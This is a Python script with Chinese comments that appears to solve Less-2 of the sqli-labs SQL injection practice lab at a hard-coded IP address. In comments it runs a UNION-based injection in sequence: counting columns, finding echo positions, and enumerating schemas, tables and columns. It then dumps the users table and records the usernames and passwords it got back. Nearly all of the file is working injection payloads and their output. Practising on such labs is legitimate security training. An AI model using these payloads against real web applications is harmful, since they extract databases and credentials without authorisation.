import requests

# 查询有多少个字段, 得到 Unknown column '4' in 'order clause', 3 的时候有回显,说明有3个字段
# payload = '-1 ORDER BY 4'
# 判断回显位, 得到 Your Login name:2<br>Your Password:3
# payload = '-1 UNION SELECT 1,2,3 '
# 查询数据库, 得到 information_schema,challenges,mysql,performance_schema,security
# payload = '-1 UNION SELECT 1,2,GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA'
# 查表, 得到 emails,referers,uagents,users
# payload = '-1 UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()'
# 查字段, 得到 id,username,password
# payload = "-1 UNION SELECT 1,2,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'"
payload = '-1 UNION SELECT 1,2,GROUP_CONCAT(username,id,password) FROM users'
# Dumb1Dumb,Angelina2I-kill-you,Dummy3p@ssword,secure4crappy,stupid5stupidity,superman6genious,batman7mob!le,admin8admin,admin19admin1,admin210admin2,admin311admin3,dhakkan12dumbo,admin414admin4
url = 'http://129.211.79.54:8801/Less-2/?id=' + payload
s = requests.session()
r = s.get(url)
print(r.text)
